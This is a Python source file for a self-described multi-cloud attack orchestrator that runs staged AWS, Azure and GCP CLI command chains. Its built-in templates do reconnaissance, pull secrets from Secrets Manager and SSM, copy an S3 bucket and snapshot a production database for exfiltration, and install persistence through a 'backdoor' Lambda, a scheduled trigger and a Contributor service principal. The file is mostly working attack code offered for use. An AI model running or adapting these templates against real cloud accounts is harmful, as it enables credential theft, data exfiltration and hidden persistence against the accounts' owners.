#!/usr/bin/env python3
"""
Multi-Cloud Attack Orchestrator
Coordinates sophisticated attacks across AWS, Azure, and GCP
"""

import json
import time
import argparse
import subprocess
from datetime import datetime
from typing import Dict, List, Optional
import concurrent.futures


class AttackOrchestrator:
    """Orchestrate multi-cloud attacks"""
    
    def __init__(self, config_file: str = None):
        self.config = {}
        self.execution_log = []
        self.attack_chain = []
        
        if config_file:
            self.load_config(config_file)
    
    def load_config(self, config_file: str):
        """Load attack configuration from JSON"""
        try:
            with open(config_file, 'r') as f:
                self.config = json.load(f)
            print(f"[+] Configuration loaded from: {config_file}")
        except Exception as e:
            print(f"[-] Failed to load config: {e}")
    
    def add_stage(self, stage_name: str, platform: str, commands: List[str], 
                  conditions: List[str] = None, parallel: bool = False):
        """Add attack stage"""
        stage = {
            'name': stage_name,
            'platform': platform,
            'commands': commands,
            'conditions': conditions or [],
            'parallel': parallel,
            'status': 'pending',
            'results': []
        }
        self.attack_chain.append(stage)
        print(f"[+] Added stage: {stage_name}")
    
    def execute_aws_command(self, command: str, profile: str = None) -> Dict:
        """Execute AWS CLI command"""
        try:
            cmd = f"aws {command}"
            if profile:
                cmd += f" --profile {profile}"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'command': command
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'command': command
            }
    
    def execute_azure_command(self, command: str) -> Dict:
        """Execute Azure CLI command"""
        try:
            cmd = f"az {command}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'command': command
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'command': command
            }
    
    def execute_gcp_command(self, command: str, project_id: str = None) -> Dict:
        """Execute GCP CLI command"""
        try:
            cmd = f"gcloud {command}"
            if project_id:
                cmd += f" --project {project_id}"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'command': command
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'command': command
            }
    
    def execute_stage(self, stage: Dict) -> bool:
        """Execute a single attack stage"""
        print(f"\n[*] Executing stage: {stage['name']}")
        print(f"    Platform: {stage['platform']}")
        print(f"    Commands: {len(stage['commands'])}")
        
        # Check conditions
        for condition in stage['conditions']:
            if not self.check_condition(condition):
                print(f"  [-] Condition failed: {condition}")
                return False
        
        results = []
        
        if stage['parallel']:
            # Execute commands in parallel
            with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
                futures = []
                
                for cmd in stage['commands']:
                    if stage['platform'].lower() == 'aws':
                        future = executor.submit(self.execute_aws_command, cmd)
                    elif stage['platform'].lower() == 'azure':
                        future = executor.submit(self.execute_azure_command, cmd)
                    elif stage['platform'].lower() == 'gcp':
                        future = executor.submit(self.execute_gcp_command, cmd)
                    
                    futures.append(future)
                
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    results.append(result)
        else:
            # Execute commands sequentially
            for cmd in stage['commands']:
                if stage['platform'].lower() == 'aws':
                    result = self.execute_aws_command(cmd)
                elif stage['platform'].lower() == 'azure':
                    result = self.execute_azure_command(cmd)
                elif stage['platform'].lower() == 'gcp':
                    result = self.execute_gcp_command(cmd)
                else:
                    result = {'success': False, 'error': 'Unknown platform'}
                
                results.append(result)
                
                # Log delay to avoid rate limiting
                time.sleep(0.5)
        
        # Process results
        successful = 0
        for result in results:
            if result['success']:
                successful += 1
                print(f"  [+] Command successful")
            else:
                print(f"  [-] Command failed: {result.get('error', 'Unknown error')}")
        
        stage['results'] = results
        stage['status'] = 'completed'
        
        return successful > 0
    
    def check_condition(self, condition: str) -> bool:
        """Check stage condition"""
        # Condition format: "previous_stage_name.success" or "variable.equals.value"
        
        if '.' not in condition:
            return True
        
        parts = condition.split('.')
        
        if parts[0] == 'previous':
            if len(self.attack_chain) < 2:
                return False
            return self.attack_chain[-1]['status'] == 'completed'
        
        # TODO: Add more condition types
        return True
    
    def execute_chain(self, dry_run: bool = False):
        """Execute full attack chain"""
        print("[*] Starting attack chain execution")
        print(f"    Total stages: {len(self.attack_chain)}")
        print(f"    Dry run: {dry_run}")
        print()
        
        for i, stage in enumerate(self.attack_chain):
            print(f"[*] Stage {i+1}/{len(self.attack_chain)}")
            
            if dry_run:
                print(f"  DRY RUN: {stage['name']}")
                print(f"    Platform: {stage['platform']}")
                print(f"    Commands:")
                for cmd in stage['commands']:
                    print(f"      - {cmd}")
                stage['status'] = 'dry_run'
            else:
                if not self.execute_stage(stage):
                    print(f"[-] Stage failed, continuing anyway")
            
            # Delay between stages
            time.sleep(2)
        
        print("\n[+] Attack chain execution complete")
        self.print_summary()
    
    def print_summary(self):
        """Print execution summary"""
        print("\n" + "="*80)
        print("EXECUTION SUMMARY")
        print("="*80)
        
        for i, stage in enumerate(self.attack_chain):
            status_icon = "✓" if stage['status'] == 'completed' else "✗" if stage['status'] == 'failed' else "?"
            print(f"\n[{status_icon}] {i+1}. {stage['name']}")
            print(f"    Platform: {stage['platform']}")
            print(f"    Status: {stage['status']}")
            
            if stage['results']:
                successful = len([r for r in stage['results'] if r.get('success')])
                print(f"    Results: {successful}/{len(stage['results'])} successful")
    
    def export_log(self, output_file: str):
        """Export execution log"""
        log_data = {
            'timestamp': datetime.now().isoformat(),
            'attack_chain': self.attack_chain,
            'config': self.config
        }
        
        try:
            with open(output_file, 'w') as f:
                json.dump(log_data, f, indent=2, default=str)
            print(f"[+] Log exported to: {output_file}")
        except Exception as e:
            print(f"[-] Failed to export log: {e}")


class ExploitationTemplate:
    """Pre-built exploitation templates"""
    
    @staticmethod
    def lateral_movement_attack() -> List[Dict]:
        """Template: Lateral movement across clouds"""
        stages = [
            {
                'name': 'AWS Reconnaissance',
                'platform': 'aws',
                'commands': [
                    'ec2 describe-instances --query "Reservations[].Instances[].[InstanceId,InstanceType,State.Name]" --output table',
                    'iam list-users --output table',
                    'secretsmanager list-secrets --output table'
                ]
            },
            {
                'name': 'AWS Credential Extraction',
                'platform': 'aws',
                'commands': [
                    'secretsmanager get-secret-value --secret-id prod/database/password --query SecretString --output text',
                    'ssm get-parameter --name /prod/db_host --query Parameter.Value --output text'
                ]
            },
            {
                'name': 'Azure Cross-Cloud Pivot',
                'platform': 'azure',
                'commands': [
                    'account show --output table',
                    'vm list --output table'
                ]
            },
            {
                'name': 'GCP Final Stage',
                'platform': 'gcp',
                'commands': [
                    'compute instances list',
                    'sql instances list'
                ]
            }
        ]
        return stages
    
    @staticmethod
    def data_exfiltration_attack() -> List[Dict]:
        """Template: Coordinated data exfiltration"""
        stages = [
            {
                'name': 'Data Discovery',
                'platform': 'aws',
                'commands': [
                    's3 ls',
                    'rds describe-db-instances --query "DBInstances[].[DBInstanceIdentifier,MasterUsername,Endpoint.Address]"'
                ]
            },
            {
                'name': 'Export S3 Data',
                'platform': 'aws',
                'commands': [
                    's3 sync s3://sensitive-bucket/ ./data/ --recursive'
                ]
            },
            {
                'name': 'Export RDS Data',
                'platform': 'aws',
                'commands': [
                    'rds create-db-snapshot --db-instance-identifier prod-db --db-snapshot-identifier exfil-snapshot'
                ]
            }
        ]
        return stages
    
    @staticmethod
    def persistence_installation() -> List[Dict]:
        """Template: Install persistence across clouds"""
        stages = [
            {
                'name': 'AWS Persistence - Lambda',
                'platform': 'aws',
                'commands': [
                    'lambda create-function --function-name backdoor --runtime python3.9 --role arn:aws:iam::123456789012:role/lambda-role --handler index.handler --zip-file fileb://backdoor.zip'
                ]
            },
            {
                'name': 'AWS Persistence - Scheduled',
                'platform': 'aws',
                'commands': [
                    'events put-rule --name backdoor-trigger --schedule-expression "rate(6 hours)"'
                ]
            },
            {
                'name': 'Azure Persistence - Service Principal',
                'platform': 'azure',
                'commands': [
                    'ad sp create-for-rbac --name backdoor-sp --role Contributor'
                ]
            }
        ]
        return stages


def main():
    parser = argparse.ArgumentParser(
        description='Multi-Cloud Attack Orchestrator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Run lateral movement template
  %(prog)s --template lateral-movement
  
  # Run data exfiltration template
  %(prog)s --template data-exfiltration
  
  # Dry run
  %(prog)s --template persistence --dry-run
  
  # Load custom configuration
  %(prog)s --config attack-plan.json --execute
        '''
    )
    
    parser.add_argument('--template', choices=['lateral-movement', 'data-exfiltration', 'persistence'],
                       help='Use pre-built template')
    parser.add_argument('--config', help='Load configuration from JSON file')
    parser.add_argument('--dry-run', action='store_true', help='Dry run (don\'t execute)')
    parser.add_argument('--execute', action='store_true', help='Execute attack chain')
    parser.add_argument('--output', help='Output log file')
    
    args = parser.parse_args()
    
    orchestrator = AttackOrchestrator(args.config)
    
    if args.template:
        print(f"[*] Loading template: {args.template}")
        
        if args.template == 'lateral-movement':
            stages = ExploitationTemplate.lateral_movement_attack()
        elif args.template == 'data-exfiltration':
            stages = ExploitationTemplate.data_exfiltration_attack()
        elif args.template == 'persistence':
            stages = ExploitationTemplate.persistence_installation()
        
        for stage in stages:
            orchestrator.add_stage(
                stage['name'],
                stage['platform'],
                stage['commands']
            )
    
    if args.execute:
        orchestrator.execute_chain(dry_run=args.dry_run)
        
        if args.output:
            orchestrator.export_log(args.output)
    else:
        print("[*] Use --execute to run attack chain")
        print(f"[*] Loaded {len(orchestrator.attack_chain)} stages")


if __name__ == '__main__':
    main()
